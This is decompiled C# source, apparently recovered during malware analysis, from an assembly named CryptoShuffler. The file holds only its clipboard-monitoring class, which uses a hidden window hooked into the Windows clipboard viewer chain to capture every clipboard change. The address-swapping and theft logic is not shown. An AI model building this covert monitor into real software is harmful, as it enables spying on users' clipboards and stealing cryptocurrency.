// Decompiled with JetBrains decompiler
// Type: ClipboardHelper.ClipboardMonitor
// Assembly: CryptoShuffler, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5F09791C-5808-4C4E-85A5-E8B78F7E37DE
// Assembly location: C:\Users\gorno\Desktop\vm\de4dot-moded\cryptoshuffler-cleaned-cleaned-cleaned-cleaned.exe

using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace ClipboardHelper
{
  public static class ClipboardMonitor
  {
    public static event ClipboardMonitor.OnClipboardChangeEventHandler OnClipboardChange;

    public static void Start()
    {
      ClipboardMonitor.ClipboardWatcher.Start();
      ClipboardMonitor.ClipboardWatcher.OnClipboardChange += (ClipboardMonitor.ClipboardWatcher.OnClipboardChangeEventHandler) ((format, data) =>
      {
        // ISSUE: reference to a compiler-generated field
        ClipboardMonitor.OnClipboardChangeEventHandler onClipboardChange = ClipboardMonitor.OnClipboardChange;
        if (onClipboardChange == null)
          return;
        int num = (int) format;
        object data1 = data;
        onClipboardChange((ClipboardFormat) num, data1);
      });
    }

    public static void Stop()
    {
      // ISSUE: reference to a compiler-generated field
      ClipboardMonitor.OnClipboardChange = (ClipboardMonitor.OnClipboardChangeEventHandler) null;
      ClipboardMonitor.ClipboardWatcher.Stop();
    }

    public delegate void OnClipboardChangeEventHandler(ClipboardFormat format, object data);

    private class ClipboardWatcher : Form
    {
      private static readonly string[] formats = Enum.GetNames(typeof (ClipboardFormat));
      private const int WM_DRAWCLIPBOARD = 776;
      private const int WM_CHANGECBCHAIN = 781;
      private static ClipboardMonitor.ClipboardWatcher mInstance;
      private static IntPtr nextClipboardViewer;

      public static event ClipboardMonitor.ClipboardWatcher.OnClipboardChangeEventHandler OnClipboardChange;

      public static void Start()
      {
        if (ClipboardMonitor.ClipboardWatcher.mInstance != null)
          return;
        Thread thread = new Thread((ParameterizedThreadStart) (object_0 => Application.Run((Form) new ClipboardMonitor.ClipboardWatcher())));
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
      }

      public static void Stop()
      {
        ClipboardMonitor.ClipboardWatcher.mInstance.Invoke((Delegate) (() => ClipboardMonitor.ClipboardWatcher.ChangeClipboardChain(ClipboardMonitor.ClipboardWatcher.mInstance.Handle, ClipboardMonitor.ClipboardWatcher.nextClipboardViewer)));
        ClipboardMonitor.ClipboardWatcher.mInstance.Invoke((Delegate) new MethodInvoker(((Form) ClipboardMonitor.ClipboardWatcher.mInstance).Close));
        ClipboardMonitor.ClipboardWatcher.mInstance.Dispose();
        ClipboardMonitor.ClipboardWatcher.mInstance = (ClipboardMonitor.ClipboardWatcher) null;
      }

      protected override void SetVisibleCore(bool value)
      {
        this.CreateHandle();
        ClipboardMonitor.ClipboardWatcher.mInstance = this;
        ClipboardMonitor.ClipboardWatcher.nextClipboardViewer = ClipboardMonitor.ClipboardWatcher.SetClipboardViewer(ClipboardMonitor.ClipboardWatcher.mInstance.Handle);
        base.SetVisibleCore(false);
      }

      [DllImport("User32.dll", CharSet = CharSet.Auto)]
      private static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);

      [DllImport("User32.dll", CharSet = CharSet.Auto)]
      private static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);

      [DllImport("user32.dll", CharSet = CharSet.Auto)]
      private static extern int SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);

      protected override void WndProc(ref Message message_0)
      {
        switch (message_0.Msg)
        {
          case 776:
            ClipboardMonitor.ClipboardWatcher.ClipChanged();
            ClipboardMonitor.ClipboardWatcher.SendMessage(ClipboardMonitor.ClipboardWatcher.nextClipboardViewer, message_0.Msg, message_0.WParam, message_0.LParam);
            break;
          case 781:
            if (message_0.WParam == ClipboardMonitor.ClipboardWatcher.nextClipboardViewer)
            {
              ClipboardMonitor.ClipboardWatcher.nextClipboardViewer = message_0.LParam;
              break;
            }
            ClipboardMonitor.ClipboardWatcher.SendMessage(ClipboardMonitor.ClipboardWatcher.nextClipboardViewer, message_0.Msg, message_0.WParam, message_0.LParam);
            break;
          default:
            base.WndProc(ref message_0);
            break;
        }
      }

      private static void ClipChanged()
      {
        IDataObject dataObject = Clipboard.GetDataObject();
        ClipboardFormat? nullable = new ClipboardFormat?();
        foreach (string format in ClipboardMonitor.ClipboardWatcher.formats)
        {
          if (dataObject.GetDataPresent(format))
          {
            nullable = new ClipboardFormat?((ClipboardFormat) Enum.Parse(typeof (ClipboardFormat), format));
            break;
          }
        }
        object data1 = dataObject.GetData(nullable.ToString());
        if ((data1 == null ? 1 : (!nullable.HasValue ? 1 : 0)) != 0)
          return;
        // ISSUE: reference to a compiler-generated field
        ClipboardMonitor.ClipboardWatcher.OnClipboardChangeEventHandler onClipboardChange = ClipboardMonitor.ClipboardWatcher.OnClipboardChange;
        if (onClipboardChange == null)
          return;
        int num = (int) nullable.Value;
        object data2 = data1;
        onClipboardChange((ClipboardFormat) num, data2);
      }

      public delegate void OnClipboardChangeEventHandler(ClipboardFormat format, object data);
    }
  }
}
